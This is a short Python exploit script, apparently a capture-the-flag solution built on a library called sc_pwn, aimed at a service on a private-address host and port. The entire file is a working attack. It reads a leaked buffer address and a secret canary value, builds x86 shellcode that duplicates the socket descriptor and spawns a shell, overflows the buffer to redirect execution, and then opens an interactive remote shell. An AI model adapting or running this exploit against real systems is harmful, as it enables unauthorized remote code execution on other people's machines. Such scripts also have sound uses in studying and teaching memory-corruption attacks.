#!/usr/bin/env python
from sc_pwn import *

rhp     = ("192.168.75.129",31338)

#==========
def attack(nc):
    addr_buf    = unpack_32(nc.read(4))
    secret      = unpack_32(nc.read(4))
    nc.read_all()
    
    info("addr_buf      = 0x%08x" % addr_buf)
    info("secret        = 0x%08x" % secret)

    sc = ShellCode('x86',0x800)
    sc.dup2(4,0)
    sc.dup2(4,1)
    sc.sh()
    sc.padding()
    shellcode = sc.get()
    
    exploit  = shellcode
    exploit += pack_32(secret)
    exploit += '\x00'*0xc
    exploit += pack_32(addr_buf)

    proc("Sending Exploit...")
    nc.send(exploit)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
